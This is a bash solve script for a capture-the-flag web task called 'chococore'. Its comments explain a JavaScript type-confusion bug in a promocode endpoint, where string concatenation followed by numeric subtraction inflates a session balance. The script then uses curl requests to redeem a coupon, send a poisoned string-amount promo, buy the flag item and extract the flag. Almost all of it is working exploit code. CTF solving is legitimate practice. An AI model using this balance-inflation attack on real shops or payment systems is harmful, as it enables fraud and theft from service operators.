#!/usr/bin/env bash
# chococore exploit.
#
# Root cause: src/app/api/promocode/route.ts mixes JS string concatenation and
# numeric subtraction.
#
#     session.balance += promo.amount;
#     try { ...validate... }
#     catch { session.balance -= promo.amount; return error; }
#     finally { updateSessionBalance(sessionId, session.balance); }
#
# When `promo.amount` is a STRING and `session.balance` is non-zero, the `+=`
# is string concatenation while `-=` is numeric subtraction. Example with
# balance=5000 and amount="1":
#     5000 += "1"   -> "50001"   (string)
#     "50001" -= "1" -> 50000    (number)
# The `finally` block persists 50000.
#
# Steps:
#   1. Bootstrap session.
#   2. Redeem TREAT5000 normally  -> balance = 5000.
#   3. Send poison promo {"amount":"1","coupon":"x"}
#      -> validation throws (amount typeof 'string') ->
#         catch subtracts numerically -> balance = 50000.
#   4. Add flag chocolate to cart.
#   5. /api/checkout: 50000 >= 31337 -> order placed.
#   6. /api/completed returns the flag.

set -euo pipefail

ROOT=/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/chococore
ART=$ROOT/artifacts
BASE=https://chococore-h7arfq5w.alfactf.ru
COOKIES=$ROOT/solve/cookies.txt

mkdir -p "$ART"
: > "$COOKIES"

UA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 chococore-solver'

call() {
  curl -sS --http2 -4 --max-time 30 \
    --retry 5 --retry-all-errors --retry-delay 3 \
    -A "$UA" \
    -b "$COOKIES" -c "$COOKIES" "$@"
}

echo "[+] bootstrap session"
call "$BASE/api/session" | tee "$ART/01_session.json"; echo

# Step 2: legit TREAT5000 redemption -> balance=5000
LEGIT_B64=$(printf '%s' '{"amount":5000,"coupon":"TREAT5000"}' | base64 | tr -d '\n')
echo "[+] redeem TREAT5000 (b64: $LEGIT_B64)"
call -X POST -H 'Content-Type: application/json' \
  -d "{\"code\":\"$LEGIT_B64\"}" \
  "$BASE/api/promocode" | tee "$ART/02_redeem.json"; echo

# Step 3: poison with STRING amount -> string concat then numeric subtract
POISON_B64=$(printf '%s' '{"amount":"1","coupon":"x"}' | base64 | tr -d '\n')
echo "[+] poison (b64: $POISON_B64)"
call -X POST -H 'Content-Type: application/json' \
  -d "{\"code\":\"$POISON_B64\"}" \
  "$BASE/api/promocode" | tee "$ART/03_poison.json"; echo

echo "[+] session after poison"
call "$BASE/api/session" | tee "$ART/04_session_after_poison.json"; echo

echo "[+] add flag to cart"
call -X POST -H 'Content-Type: application/json' \
  -d '{"chocolateId":"flag","quantity":1}' \
  "$BASE/api/cart" | tee "$ART/05_cart.json"; echo

echo "[+] checkout"
call -X POST -H 'Content-Type: application/json' \
  -d '{}' \
  "$BASE/api/checkout" | tee "$ART/06_checkout.json"; echo

echo "[+] fetch completed order"
call "$BASE/api/completed" | tee "$ART/07_completed.json"; echo

echo
echo "[+] flag candidates:"
grep -oE 'alfa\{[^}]+\}' "$ART/07_completed.json" || echo "no flag found"
